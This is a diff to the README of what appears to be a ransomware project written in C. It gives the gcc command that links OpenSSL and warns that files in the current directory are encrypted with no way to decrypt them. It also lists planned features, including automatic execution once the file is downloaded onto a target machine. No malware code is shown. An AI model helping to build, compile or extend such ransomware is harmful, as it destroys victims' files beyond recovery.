@@ -17,5 +17,6 @@ To link all necessary libraries while compiling use the command below :
 ```
 gcc ransomware.c -o ransomware.out -lssl -lcrypto
 ```
-The file does not have an exclusion on itself, this means that all the files in the current dir are encrypted including the sourcecode and the executable !!!!
-This is the first version, more features will be added soon.
+- The file does not have an exclusion on itself, this means that all the files in the current dir are encrypted including the sourcecode and the executable !!!!
+- There's no option to decrypt the encrypted files so be carefull where you use this code 
+- This is the first version, more features will be added soon ( decrypt files, method to auto run when downloaded on the target machine, etc)
